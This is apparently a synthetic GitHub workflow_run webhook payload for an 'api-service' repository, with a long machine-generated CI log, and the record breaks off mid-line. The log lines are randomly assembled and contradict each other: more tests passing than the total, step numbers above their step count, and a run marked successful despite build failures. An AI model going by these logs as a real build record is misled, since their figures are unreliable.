{
  "action": "completed",
  "workflow_run": {
    "id": 27,
    "name": "CI Pipeline",
    "head_branch": "feature/feat-953",
    "head_sha": "0beab9cb549af8f2908b80bf205fb3871e63e4ae",
    "status": "completed",
    "conclusion": "success",
    "run_started_at": "2025-11-24T12:17:40.298524Z",
    "updated_at": "2025-11-24T12:19:59.683204Z"
  },
  "repository": {
    "full_name": "acme-corp/api-service",
    "name": "api-service"
  },
  "sender": {
    "login": "henry"
  },
  "_safeops_extended": {
    "raw_logs": "=== Step: restore_cache ===\nLoading...\nOK\nConnection established\nMinifying app.js\n[12:17:40] INFO: Request completed\nArtifact uploaded: build.tar.gz (10MB)\nnpm install: resolved 882 packages\n\u2713 Step 'install' succeeded\nCache hit for key-6591\nNODE_ENV=production\npip: Installing build dependencies...\nTest Suites: 28 passed, 20 total\nNODE_ENV=development\nSnapshots: 43 passed, 14 total\nTime: 94.263s\nTLS handshake completed\nPushing to registry...\nReady.\n[12:17:40] DEBUG: Connection pool: 15 active\nStep 6/17: Installing dependencies\n[12:17:40] INFO: Connecting to database\n\u2713 Task completed in 4751ms\npip install: Successfully installed eslint-2.1\n[12:17:40] WARN: Deprecated API usage\nEnvironment: production\nCache restored successfully (490MB)\nInstalling jest@4.3.2\nCompiling utils/handler.rs...\nReady.\n  PASS: test_auth_login (16ms)\nTime: 31.764s\n\u2717 build failed with exit code 47\n[12:17:40] INFO: Cache refreshed\n[12:17:40] INFO: Request completed\nCache invalidated: node_modules\nnpm notice: created a lockfile\nSwitched to branch 'hotfix/task-657'\nUsing Node.js 16.3.5\nStep 14/19: Deploying\nPlatform: darwin-arm64\nStep 14/17: Linting\nSuccess!\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\nVerifying...\n\u2713 package completed\nPlatform: linux-x64\nTransforming 951 files...\n[12:17:40] ERROR: Connection failed\nStep 1/22: Linting\nHEAD is now at e2fdf09\nPulling image: alpine:latest\nUsing Python 3.12\nPlatform: win32-x64\n[12:17:40] WARN: Deprecated API usage\nSwitched to branch 'bugfix/task-378'\n\u2713 deploy completed\nSuccess!\nOptimizing 53 modules...\nArtifact uploaded: build.tar.gz (49MB)\n[12:17:40] INFO: Starting build process\nPOST /data - 200 (459ms)\nCompiling src/service.java...\n[12:17:40] INFO: Starting build process\nOK\nCoverage: 75% statements, 97% branches\npip install: Successfully installed lodash-5.12\nCache miss for key-6956\nCompiling components/app.ts...\nnpm install: added 356 packages\n[12:17:40] INFO: Connecting to database\nFAILED: test_cache_hit\nSwitched to branch 'bugfix/task-846'\n\u2717 build failed with exit code 5\nnpm install: resolved 849 packages\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nWARNING: react has known vulnerabilities\n\u2713 Step 'checkout' succeeded\nStep 17/22: Building\n[12:17:40] DEBUG: Query executed in 56ms\nAlready up to date.\nGET /status - 204 (21ms)\n[12:17:40] WARN: Deprecated API usage\nAlready up to date.\nStep 7/23: Installing dependencies\nConnection established\nBuilding Docker image...\nCache hit for key-1941\nCompiling components/index.js...\nSuccess!\nnpm notice: package.json updated\nTests: 335 passed, 430 total\nStep 11/25: Running migrations\nProcessing...\n\u2713 Step 'checkout' succeeded\nHEAD is now at 21a5f6d\nTime: 50.648s\nStep 1/24: Linting\n  PASS: unit/test_auth_login.spec.js\nSnapshots: 16 passed, 0 total\npip install: Successfully installed axios-4.15\nCache hit for key-6279\nReady.\nTLS handshake completed\n[12:17:40] INFO: Connecting to database\nNODE_ENV=development\n[12:17:40] ERROR: Connection failed\nCoverage: 91% statements, 76% branches\n[12:17:40] INFO: Starting build process\nCompiling components/main.py...\n[12:17:40] INFO: Cache refreshed\nStep 18/19: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling lib/index.js...\n\u2713 Task completed in 1662ms\nCompiling src/handler.rs...\nCompiling utils/index.js...\nSuccess!\nAlready up to date.\nStep 1/15: Running migrations\nPOST /data - 200 (147ms)\n[12:17:40] DEBUG: Memory usage: 745MB\nStep 8/15: Building\nDone.\npip: Collecting jest\nPlatform: darwin-arm64\nVerifying...\nStep 4/15: Building\nCoverage: 90% statements, 76% branches\npip: Installing build dependencies...\nStep 15/16: Linting\n\u2717 build failed with exit code 111\nnpm install: added 316 packages\nNODE_ENV=test\n[12:17:40] DEBUG: Connection pool: 2 active\nnpm notice: created a lockfile\nBundling runtime.js\nCompiling components/index.js...\n[12:17:40] DEBUG: Connection pool: 5 active\nStep 4/23: Linting\n[12:17:40] ERROR: Connection failed\nFetching submodules...\n\u2713 All checks passed\nMinifying app.js\nCompiling src/main.py...\nnpm install: added 385 packages\n\u2713 Task completed in 2428ms\nOptimizing 34 modules...\nGET /health - 204 (90ms)\nOK\nWARNING: lodash has known vulnerabilities\n[12:17:40] INFO: Processing request\n\u2713 deploy completed\nTLS handshake completed\n  PASS: test_user_create (318ms)\nOptimizing 12 modules...\n  PASS: test_db_connect (467ms)\n\u2713 Task completed in 1677ms\n\u2713 All checks passed\nCompleted.\nSwitched to branch 'hotfix/task-851'\nSwitched to branch 'hotfix/task-323'\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nArtifact uploaded: build.tar.gz (28MB)\nDone.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\npip: Collecting express\nCoverage: 82% statements, 83% branches\nMinifying main.js\npip: Downloading prettier-5.10.tar.gz\n\u2713 Task completed in 3323ms\nSuccess!\n=== Step restore_cache completed ===\n=== Step: integration_tests ===\nOptimizing 52 modules...\nnpm notice: package.json updated\n  PASS: test_user_create (334ms)\nCompiling src/utils.go...\n[12:17:40] INFO: Starting build process\nTest Suites: 28 passed, 35 total\nCache invalidated: dependencies\nStep 10/19: Deploying\nInstalling eslint@1.15.4\nGET /status - 201 (17ms)\n[12:17:40] INFO: Processing request\n[12:17:40] INFO: Cache refreshed\n[12:17:40] DEBUG: Initializing service\nCompleted.\nCompiling utils/index.js...\nCompiling utils/utils.go...\n\u2713 Task completed in 2922ms\nArtifact downloaded: 31MB\nGenerating source maps...\n[12:17:40] DEBUG: Connection pool: 11 active\npip: Downloading react-2.10.tar.gz\nCompiling lib/utils.go...\nnpm install: resolved 1103 packages\nConnecting to example.com:443...\nSwitched to branch 'hotfix/task-943'\n[12:17:40] WARN: Deprecated API usage\n[12:17:40] INFO: Processing request\nSwitched to branch 'bugfix/task-850'\nSwitched to branch 'feature/task-375'\nStep 15/24: Linting\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'hotfix/task-892'\n[12:17:40] INFO: Processing request\nGenerating source maps...\nFetching submodules...\nInstalling prettier@4.10.4\nTransforming 116 files...\nOK\nSwitched to branch 'hotfix/task-375'\nCache miss for key-5572\nCache miss for key-4940\nRan 146 tests in 60s\nPOST /upload - 201 (72ms)\nCache hit for key-5118\nReady.\nGenerating source maps...\n[12:17:40] DEBUG: Loading configuration\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nCache invalidated: dependencies\nStep 15/22: Testing\nConnection established\nnpm install: added 244 packages\nReady.\nAlready up to date.\nnpm install: added 77 packages\nRan 41 tests in 49s\n[12:17:40] ERROR: Connection failed\nPulling image: python:3.11\n[12:17:40] INFO: Connecting to database\nGenerating source maps...\nCache saved successfully\n[12:17:40] INFO: Processing request\nImage pulled successfully\nCache miss for key-1531\nDone.\nStep 5/15: Installing dependencies\n[12:17:40] WARN: Deprecated API usage\npip: Installing build dependencies...\n[12:17:40] INFO: Processing request\nConnection established\nPOST /data - 200 (342ms)\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nBuilding Docker image...\npip: Downloading axios-5.20.tar.gz\n[12:17:40] INFO: Connecting to database\nWaiting...\nFAILED: test_cache_hit\nPulling image: alpine:3.11\nWaiting...\nBuilding Docker image...\nCreating production build...\n[12:17:40] DEBUG: Connection pool: 13 active\n[12:17:40] WARN: Deprecated API usage\nPushing to registry...\nCache miss for key-4614\nDone.\npip: Installing build dependencies...\nCompiling utils/service.java...\nFAILED: test_api_health\nTest Suites: 42 passed, 8 total\nCache invalidated: build\nCache miss for key-2687\nFinished.\nTime: 73.12s\nImage pulled successfully\nUsing Node.js 15.6.1\nyarn add: Done in 13.46s\nChecking out main branch\nGenerating source maps...\nStep 8/18: Linting\nVerifying...\n[12:17:40] ERROR: Connection failed\nWARNING: eslint has known vulnerabilities\nStep 8/18: Testing\nCreating production build...\nGET /api - 204 (61ms)\nVerifying...\nGenerating source maps...\nConnection established\nCache invalidated: node_modules\n  PASS: test_db_connect (365ms)\nPulling image: alpine:latest\nTLS handshake completed\nFetching submodules...\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:17:40] WARN: Deprecated API usage\n\u2713 package completed\nFinished.\nTLS handshake completed\nHEAD is now at 7d48846\nArtifact downloaded: 29MB\nTransforming 252 files...\nUploading artifact 'build' (44 files)\nWARNING: express has known vulnerabilities\nCompiling lib/handler.rs...\nTests: 218 passed, 268 total\nTest Suites: 16 passed, 9 total\nNODE_ENV=development\n  PASS: integration/test_cache_hit.spec.js\nEnvironment: test\npip install: Successfully installed webpack-1.15\nCompleted.\n[12:17:40] INFO: Cache refreshed\n[12:17:40] DEBUG: Initializing service\nPOST /data - 200 (439ms)\nCache restored successfully (61MB)\nLayer 2/8: ENV command\nWaiting...\nCache saved successfully\nStep 9/18: Running migrations\nCache miss for key-4540\nCompiling components/main.py...\nnpm notice: package.json updated\nTime: 55.701s\nBuilding Docker image...\nLayer 3/10: RUN command\nArtifact uploaded: dist.zip (76MB)\nSnapshots: 14 passed, 22 total\nDone.\nGET /status - 201 (93ms)\nAlready up to date.\n\u2713 build completed\npip install: Successfully installed webpack-3.3\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nHEAD is now at c7e9b78\nOK\nArtifact downloaded: 1MB\n  PASS: unit/test_api_health.spec.js\nFetching submodules...\nLayer 5/14: RUN command\nSuccess!\nFetching submodules...\nOK\nTests: 66 passed, 376 total\nArtifact uploaded: build.tar.gz (49MB)\nConnection established\nCoverage: 80% statements, 61% branches\nCompiling lib/main.py...\nnpm notice: package.json updated\nConnecting to test.io:443...\nTest Suites: 38 passed, 18 total\n=== Step integration_tests completed ===\n=== Step: checkout ===\nStep 19/15: Deploying\nTest Suites: 10 passed, 44 total\nVerifying...\nCreating production build...\nWaiting...\nGET /health - 201 (97ms)\n[12:17:40] INFO: Processing request\nConnection established\nStep 20/20: Installing dependencies\nPOST /upload - 201 (129ms)\n[12:17:40] DEBUG: Query executed in 7ms\n\u2713 Task completed in 2167ms\nEnvironment: test\nEnvironment: production\nnpm notice: package.json updated\n  PASS: test_db_connect (220ms)\nCompiling lib/handler.rs...\nChecking out main branch\nSwitched to branch 'feature/task-353'\nnpm notice: package.json updated\nSuccess!\nCoverage: 97% statements, 66% branches\nLayer 3/14: RUN command\nPlatform: darwin-arm64\n[12:17:40] DEBUG: Query executed in 36ms\nCache miss for key-1829\nCompleted.\nTests: 175 passed, 465 total\nException: NullPointerException\nSwitched to branch 'bugfix/task-575'\n[12:17:40] INFO: Request completed\nLayer 4/15: COPY command\nUsing Node.js 15.10.4\nCache restored successfully (445MB)\nFinished.\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:17:40] DEBUG: Loading configuration\nCache invalidated: dependencies\nPushing to registry...\nPlatform: linux-x64\nCache saved successfully\npip: Downloading eslint-1.6.tar.gz\nSuccess!\nProcessing...\n[12:17:40] INFO: Request completed\nLayer 9/14: COPY command\nnpm install: resolved 280 packages\nWARNING: react has known vulnerabilities\npip: Installing build dependencies...\nFetching submodules...\nImage pulled successfully\nConnecting to example.com:443...\nStep 19/16: Building\n[12:17:40] WARN: Deprecated API usage\nStep 11/16: Linting\n  PASS: test_db_connect (93ms)\nWARNING: jest has known vulnerabilities\nEnvironment: production\n[12:17:40] INFO: Processing request\n[12:17:40] INFO: Connecting to database\n\u2713 Task completed in 2429ms\nTest Suites: 30 passed, 7 total\nCache restored successfully (132MB)\nBuilding Docker image...\nArtifact uploaded: build.tar.gz (41MB)\nCache restored successfully (181MB)\nArtifact uploaded: build.tar.gz (32MB)\nImage pulled successfully\nAlready up to date.\nnpm notice: created a lockfile\nCompleted.\nnpm install: added 319 packages\nUsing Python 3.10\npip install: Successfully installed webpack-2.12\nCompiling src/main.py...\n[12:17:40] INFO: Request completed\nSnapshots: 11 passed, 48 total\nSuccess!\n[12:17:40] DEBUG: Initializing service\nPOST /data - 202 (373ms)\nStep 13/23: Testing\nArtifact downloaded: 15MB\nCache hit for key-5937\nPOST /upload - 200 (242ms)\nCache miss for key-9797\n\u2713 All checks passed\nPushing to registry...\nGET /health - 201 (23ms)\nBuilding Docker image...\n\u2713 build completed\nArtifact downloaded: 1MB\nUsing Python 3.9\nAlready up to date.\n\u2713 Step 'checkout' succeeded\nCompiling utils/handler.rs...\nGET /status - 204 (33ms)\nOptimizing 82 modules...\nCache restored successfully (237MB)\nnpm notice: created a lockfile\nCreating production build...\nPulling image: python:latest\nBundling styles.css\nArtifact downloaded: 38MB\nStep 4/21: Deploying\nReady.\nnpm install: added 500 packages\nLoading...\nCache miss for key-4327\nFinished.\nnpm notice: package.json updated\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nInstalling prettier@3.11.2\n[12:17:40] INFO: Processing request\nnpm install: resolved 157 packages\nUploading artifact 'coverage' (10 files)\nVerifying...\nStep 8/23: Deploying\n  PASS: test_cache_hit (407ms)\n[12:17:40] INFO: Processing request\n[12:17:40] INFO: Processing request\nWaiting...\nVerifying...\nAlready up to date.\nStep 19/23: Running migrations\nCompleted.\nProcessing...\n[12:17:40] INFO: Connecting to database\nnpm install: resolved 582 packages\npip: Collecting express\n\u2713 package completed\n  PASS: test_db_connect (44ms)\nyarn add: Done in 12.33s\nStep 17/17: Linting\n  PASS: unit/test_cache_hit.spec.js\nPushing to registry...\nCache saved successfully\npip: Downloading jest-2.1.tar.gz\nBuilding Docker image...\nImage pulled successfully\n\u2713 package completed\nLayer 6/9: RUN command\nUploading artifact 'build' (49 files)\nStep 11/22: Installing dependencies\nProcessing...\nArtifact downloaded: 27MB\nTests: 285 passed, 192 total\nArtifact uploaded: build.tar.gz (13MB)\nnpm install: resolved 1167 packages\nTime: 89.44s\n[12:17:40] INFO: Connecting to database\nOK\nTest Suites: 5 passed, 35 total\nPlatform: linux-x64\n[12:17:40] INFO: Connecting to database\nnpm install: resolved 1916 packages\n[12:17:40] DEBUG: Query executed in 21ms\nBuilding Docker image...\nImage pulled successfully\nStep 14/16: Deploying\nnpm install: resolved 407 packages\nStep 2/18: Testing\nBundling vendor.js\nInstalling lodash@1.9.2\nPlatform: darwin-arm64\nWARNING: prettier has known vulnerabilities\npip: Installing build dependencies...\nImage pulled successfully\nInstalling react@5.19.5\n[12:17:40] INFO: Request completed\nCache miss for key-7934\nSnapshots: 50 passed, 20 total\nnpm install: added 10 packages\n=== Step checkout completed ===\n=== Step: setup_node ===\nPulling image: node:18\nStep 16/15: Installing dependencies\nUsing Python 3.9\nyarn add: Done in 7.92s\nCache restored successfully (268MB)\n  PASS: e2e/test_db_connect.spec.js\nFinished.\nnpm notice: created a lockfile\nStep 11/24: Running migrations\nHEAD is now at f51a6fb\n\u2713 deploy completed\nUsing Python 3.12\nArtifact uploaded: build.tar.gz (37MB)\nBundling runtime.css\nOK\nPlatform: darwin-arm64\n[12:17:40] INFO: Cache refreshed\nGET /status - 200 (17ms)\n[12:17:40] WARN: Deprecated API usage\nException: ValueError\nCache restored successfully (410MB)\nInstalling prettier@3.15.7\nArtifact uploaded: build.tar.gz (48MB)\nCompiling lib/main.py...\n[12:17:40] DEBUG: Connection pool: 12 active\nGET /api - 204 (93ms)\nWARNING: lodash has known vulnerabilities\nConnection established\nArtifact downloaded: 7MB\npip: Installing build dependencies...\nSnapshots: 15 passed, 16 total\n[12:17:40] DEBUG: Connection pool: 11 active\nCompleted.\nCache miss for key-3472\n  PASS: test_user_create (63ms)\nUsing Python 3.9\nUsing Node.js 14.0.6\nAlready up to date.\nCache saved successfully\nnpm install: resolved 1934 packages\nNODE_ENV=development\nCompleted.\n\u2713 All checks passed\nnpm notice: created a lockfile\nnpm install: added 467 packages\nOK\nInstalling eslint@4.4.10\nTime: 3.242s\n[12:17:40] WARN: Deprecated API usage\nCompiling components/service.java...\nInstalling lodash@4.4.5\nTests: 256 passed, 281 total\nEnvironment: staging\nNODE_ENV=test\nSnapshots: 7 passed, 21 total\nWaiting...\nWaiting...\nStep 17/18: Running migrations\nProcessing...\nStep 7/20: Building\n[12:17:40] DEBUG: Loading configuration\nPlatform: linux-x64\nPlatform: darwin-arm64\nInstalling jest@4.17.0\nnpm install: added 66 packages\n[12:17:40] DEBUG: Connection pool: 19 active\n[12:17:40] INFO: Request completed\n[12:17:40] INFO: Connecting to database\nNODE_ENV=production\nException: RuntimeError\nConnection established\nCache hit for key-8190\nNODE_ENV=development\npip install: Successfully installed prettier-3.14\n[12:17:40] DEBUG: Initializing service\n\u2717 build failed with exit code 24\nHEAD is now at a6fb4a4\nTest Suites: 30 passed, 8 total\n[12:17:40] WARN: Deprecated API usage\npip: Collecting lodash\nStep 9/15: Running migrations\nnpm notice: created a lockfile\nChecking out main branch\nConnection established\nConnection established\nCreating production build...\n[12:17:40] DEBUG: Connection pool: 16 active\nCache miss for key-4600\nCache saved successfully\nArtifact downloaded: 50MB\nImage pulled successfully\nCompiling lib/index.js...\nVerifying...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nArtifact uploaded: dist.zip (31MB)\nTime: 15.608s\nTLS handshake completed\nTime: 18.348s\nAlready up to date.\nCompiling utils/index.js...\nUsing Python 3.10\nVerifying...\nCache hit for key-3101\nArtifact uploaded: dist.zip (11MB)\nEnvironment: test\nEnvironment: test\nStep 4/25: Testing\nUploading artifact 'coverage' (21 files)\nHEAD is now at 3a14ec1\nCompiling components/main.py...\nnpm notice: created a lockfile\nCompiling utils/main.py...\nCache restored successfully (76MB)\n[12:17:40] DEBUG: Loading configuration\nFinished.\nCompiling utils/handler.rs...\nSuccess!\nFinished.\nMinifying main.js\n[12:17:40] INFO: Cache refreshed\n[12:17:40] DEBUG: Connection pool: 19 active\n[12:17:40] INFO: Processing request\nPlatform: darwin-arm64\npip install: Successfully installed axios-1.17\n[12:17:40] INFO: Request completed\nConnection established\nWARNING: webpack has known vulnerabilities\nPulling image: node:3.11\n  PASS: e2e/test_auth_login.spec.js\nChecking out main branch\n\u2713 All checks passed\nPushing to registry...\nArtifact uploaded: build.tar.gz (10MB)\nStep 20/25: Installing dependencies\nWaiting...\nSnapshots: 14 passed, 10 total\nBundling styles.js\nUsing Node.js 17.5.6\nProcessing...\nnpm notice: created a lockfile\nTest Suites: 9 passed, 26 total\nPushing to registry...\n\u2713 Task completed in 899ms\n[12:17:40] ERROR: Connection failed\nChecking out main branch\nWARNING: webpack has known vulnerabilities\nWARNING: express has known vulnerabilities\n[12:17:40] INFO: Request completed\nHEAD is now at 9519eb8\nCache saved successfully\n[12:17:40] WARN: Deprecated API usage\npip: Installing build dependencies...\nUsing Python 3.12\nTLS handshake completed\nArtifact uploaded: build.tar.gz (40MB)\n[12:17:40] INFO: Processing request\nPulling image: node:latest\nLayer 7/15: ENV command\nConnecting to test.io:443...\nVerifying...\nHEAD is now at e24a3d0\nTest Suites: 18 passed, 27 total\n[12:17:40] DEBUG: Connection pool: 4 active\nCache saved successfully\nHEAD is now at fa21a80\nReady.\n[12:17:40] DEBUG: Connection pool: 10 active\nWARNING: jest has known vulnerabilities\n[12:17:40] DEBUG: Initializing service\nSwitched to branch 'bugfix/task-471'\nMinifying vendor.js\n[12:17:40] DEBUG: Loading configuration\n=== Step setup_node completed ===\n=== Step: install_dependencies ===\nRan 44 tests in 7s\nRan 154 tests in 23s\nChecking out develop branch\nException: RuntimeError\nSnapshots: 41 passed, 10 total\n\u2713 Task completed in 662ms\n[12:17:40] DEBUG: Initializing service\nTransforming 150 files...\n[12:17:40] ERROR: Connection failed\nNODE_ENV=test\nWaiting...\n[12:17:40] INFO: Connecting to database\nMinifying vendor.js\nBundling vendor.css\nCompiling src/handler.rs...\nCompiling utils/service.java...\nConnecting to cloud.services:443...\nSuccess!\nyarn add: Done in 14.65s\nWARNING: react has known vulnerabilities\nnpm install: resolved 1126 packages\nGenerating source maps...\nCache saved successfully\n[12:17:40] INFO: Starting build process\nGenerating source maps...\npip: Downloading webpack-1.3.tar.gz\nArtifact downloaded: 14MB\n[12:17:40] INFO: Processing request\nCompleted.\nCompiling utils/app.ts...\nGenerating source maps...\n[12:17:40] INFO: Request completed\nArtifact downloaded: 11MB\nSnapshots: 38 passed, 10 total\nnpm install: added 67 packages\npip: Collecting prettier\nVerifying...\nSuccess!\n[12:17:40] INFO: Starting build process\nCompiling src/index.js...\n[12:17:40] DEBUG: Memory usage: 313MB\nBuilding Docker image...\nUsing Node.js 14.13.8\nCache invalidated: node_modules\nFetching submodules...\nFinished.\n\u2717 build failed with exit code 33\nLoading...\nEnvironment: development\nNODE_ENV=production\nStep 19/16: Installing dependencies\nnpm notice: created a lockfile\nOK\nStep 1/22: Running migrations\nException: RuntimeError\n[12:17:40] WARN: Deprecated API usage\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nChecking out master branch\npip install: Successfully installed react-3.10\nCreating production build...\nWaiting...\nMinifying app.js\n[12:17:40] INFO: Request completed\nSuccess!\nWARNING: prettier has known vulnerabilities\n[12:17:40] INFO: Request completed\npip install: Successfully installed lodash-5.11\nCompiling src/main.py...\nTLS handshake completed\nStep 3/21: Building\nCompiling utils/utils.go...\n[12:17:40] DEBUG: Initializing service\nFAILED: test_cache_hit\nConnecting to example.com:443...\nArtifact uploaded: dist.zip (57MB)\npip: Installing build dependencies...\nCache hit for key-5752\nStep 4/17: Testing\nConnecting to startup.dev:443...\npip: Installing build dependencies...\nCache saved successfully\nOK\nyarn add: Done in 8.28s\n[12:17:40] DEBUG: Connection pool: 1 active\nPulling image: node:3.11\nCreating production build...\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:17:40] DEBUG: Query executed in 29ms\nStep 12/19: Installing dependencies\nArtifact uploaded: build.tar.gz (7MB)\nGET /health - 200 (29ms)\nConnection established\n  PASS: unit/test_db_connect.spec.js\n[12:17:40] WARN: Deprecated API usage\nBundling vendor.js\nWaiting...\n[12:17:40] ERROR: Connection failed\nUsing Node.js 17.20.9\n[12:17:40] ERROR: Connection failed\nRan 19 tests in 15s\nFetching submodules...\nCoverage: 84% statements, 64% branches\nnpm install: added 240 packages\nUploading artifact 'build' (43 files)\nAlready up to date.\nTLS handshake completed\nPlatform: darwin-arm64\nOptimizing 25 modules...\nGenerating source maps...\nnpm install: added 463 packages\nMinifying vendor.js\nCompiling lib/service.java...\nBundling main.css\nConnection established\nChecking out main branch\nCreating production build...\nCoverage: 94% statements, 70% branches\nMinifying app.js\nPlatform: linux-x64\nConnecting to startup.dev:443...\n[12:17:40] DEBUG: Memory usage: 1270MB\nGenerating source maps...\n[12:17:40] INFO: Cache refreshed\nCoverage: 85% statements, 98% branches\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nVerifying...\nCompiling components/app.ts...\n[12:17:40] INFO: Starting build process\nConnecting to example.com:443...\nArtifact uploaded: dist.zip (29MB)\nnpm install: resolved 1916 packages\n[12:17:40] WARN: Deprecated API usage\n\u2713 All checks passed\nCache hit for key-6492\nMinifying vendor.js\nEnvironment: production\nReady.\n  PASS: e2e/test_cache_hit.spec.js\nyarn add: Done in 12.98s\nCache hit for key-5463\nCache restored successfully (368MB)\n\u2713 All checks passed\nSuccess!\n\u2713 Task completed in 3414ms\nUsing Python 3.9\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n[12:17:40] INFO: Connecting to database\nTests: 214 passed, 183 total\nWARNING: axios has known vulnerabilities\nNODE_ENV=development\nInstalling jest@5.16.5\n  PASS: unit/test_user_create.spec.js\nPulling image: python:18\nEnvironment: development\nArtifact uploaded: dist.zip (45MB)\n[12:17:40] DEBUG: Connection pool: 9 active\n[12:17:40] INFO: Starting build process\n  PASS: integration/test_api_health.spec.js\nOK\nyarn add: Done in 27.31s\nWaiting...\n[12:17:40] DEBUG: Initializing service\nCache saved successfully\nReady.\nTransforming 922 files...\nVerifying...\nBundling styles.css\nException: RuntimeError\nHEAD is now at e31d099\n  PASS: unit/test_auth_login.spec.js\nWARNING: eslint has known vulnerabilities\nAlready up to date.\n=== Step install_dependencies completed ===\n=== Step: setup_environment ===\nCache invalidated: dependencies\nBundling runtime.css\nStep 8/16: Testing\nWaiting...\nReady.\nOK\nnpm notice: package.json updated\nHEAD is now at eca3add\nWaiting...\nCompiling components/handler.rs...\nRan 162 tests in 15s\n[12:17:40] WARN: Deprecated API usage\nConnection established\nCompiling components/handler.rs...\nInstalling prettier@5.11.7\n[12:17:40] DEBUG: Initializing service\n[12:17:40] INFO: Connecting to database\n[12:17:40] DEBUG: Initializing service\nBundling styles.css\nStep 2/24: Building\n\u26a0 DEPRECATION: Feature will be removed in v2.0\n[12:17:40] INFO: Processing request\nVerifying...\nWARNING: react has known vulnerabilities\nArtifact uploaded: dist.zip (9MB)\nPulling image: python:latest\nCompiling utils/handler.rs...\nCache saved successfully\nTransforming 469 files...\nOptimizing 47 modules...\nWaiting...\n[12:17:40] DEBUG: Memory usage: 1222MB\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nCompiling utils/service.java...\nStep 11/25: Linting\nCompiling components/app.ts...\nWARNING: prettier has known vulnerabilities\nnpm notice: created a lockfile\nOptimizing 34 modules...\n\u2713 Task completed in 3528ms\nnpm notice: created a lockfile\n[12:17:40] DEBUG: Loading configuration\nChecking out main branch\npip install: Successfully installed lodash-1.12\n\u2713 All checks passed\nGET /status - 200 (42ms)\nnpm notice: package.json updated\nnpm notice: created a lockfile\nWaiting...\nMinifying main.js\nDone.\nTLS handshake completed\n[12:17:40] INFO: Request completed\nStep 11/20: Running migrations\n\u2713 All checks passed\nConnection established\nnpm notice: package.json updated\nSnapshots: 13 passed, 40 total\nCompleted.\nRan 166 tests in 40s\n[12:17:40] INFO: Connecting to database\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n\u26a0 DEPRECATION: Feature will be removed in v3.0\nSwitched to branch 'hotfix/task-690'\nCache restored successfully (240MB)\npip: Installing build dependencies...\nInstalling jest@1.17.7\nSuccess!\n[12:17:40] INFO: Cache refreshed\nLayer 4/14: ENV command\nPushing to registry...\nStep 9/20: Building\nCache invalidated: dependencies\nConnection established\nPulling image: node:3.11\nTest Suites: 31 passed, 19 total\nArtifact downloaded: 18MB\nNODE_ENV=test\n[12:17:40] DEBUG: Initializing service\nTLS handshake completed\n[12:17:40] INFO: Connecting to database\nProcessing...\nPOST /upload - 202 (317ms)\n\u2713 validate completed\nCoverage: 94% statements, 91% branches\nStep 5/16: Running migrations\nImage pulled successfully\nLayer 7/9: ENV command\n[12:17:40] DEBUG: Connection pool: 4 active\n[12:17:40] INFO: Request completed\npip install: Successfully installed express-1.11\nArtifact uploaded: dist.zip (58MB)\nRan 179 tests in 19s\nCache miss for key-6672\n\u2713 Task completed in 3978ms\nCache hit for key-4883\npip: Downloading prettier-2.20.tar.gz\nUploading artifact 'coverage' (31 files)\nTLS handshake completed\nStep 4/20: Running migrations\nStep 10/23: Building\nCompiling components/handler.rs...\nException: TypeError\nCache miss for key-5943\nStep 14/17: Linting\nStep 5/18: Deploying\nCompiling lib/handler.rs...\npip: Installing build dependencies...\nReady.\n[12:17:40] ERROR: Connection failed\nUploading artifact 'dist' (45 files)\nArtifact downloaded: 9MB\nWARNING: react has known vulnerabilities\n\u2713 Task completed in 642ms\nInstalling prettier@1.18.4\nArtifact uploaded: build.tar.gz (3MB)\nnpm install: resolved 1698 packages\n\u2713 All checks passed\nUsing Node.js 18.8.3\nCache restored successfully (212MB)\nChecking out develop branch\nLoading...\nCompleted.\nArtifact uploaded: dist.zip (55MB)\nCache miss for key-4478\n\u26a0 DEPRECATION: Feature will be removed in v2.0\nConnection established\n\u26a0 DEPRECATION: Feature will be removed in v3.0\n[12:17:40] DEBUG: Memory usage: 1771MB\nStep 4/18: Testing\nStep 16/17: Installing dependencies\nCoverage: 80% statements, 92% branches\nGET /health - 201 (95ms)\n\u2713 All checks passed\n\u2713 test completed\nCache restored successfully (401MB)\nCache invalidated: build\n[12:17:40] DEBUG: Connection pool: 17 active\n[12:17:40] WARN: Deprecated API usage\nCompleted.\n[12:17:40] WARN: Deprecated API usage\npip: Installing build dependencies...\nLoading...\nPushing to registry...\nCompiling utils/main.py...\nCache restored successfully (319MB)\nOptimizing 16 modules...\n[12:17:40] WARN: Deprecated API usage\n[12:17:40] WARN: Deprecated API usage\n[12:17:40] INFO: Processing request\npip install: Successfully installed axios-1.9\nWaiting...\nDone.\nSuccess!\nTest Suites: 32 passed, 27 total\nGenerating source maps...\nPOST /data - 201 (141ms)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\nProcessing...\npip: Installing build dependencies...\nLoading...\nnpm notice: package.json updated\n[12:17:40] INFO: Request completed\nTests: 335 passed, 220 total\n\u2713 Task completed in 2729ms\nTest Suites: 39 passed, 12 total\nOK\nArtifact uploaded: dist.zip (76MB)\n  PASS: e2e/test_cache_hit.spec.js\n[12:17:40] ERROR: Connection failed\npip: Collecting webpack\nStep 6/23: Deploying\n=== Step setup_environment completed ===\n=== Step: type_check ===\nReady.\n\u2713 Task completed in 3249ms\nCompleted.\n[12:17:40] INFO: Cache refreshed\nPOST /api - 202 (485ms)\nCache restored successfully (383MB)\nHEAD is now at 0cd43ca\nInstalling lodash@5.16.3\nCompiling utils/utils.go...\nCache invalidated: node_modules\nAlready up to date.\npip install: Successfully installed lodash-1.0\nCache restored successfully (222MB)\nInstalling 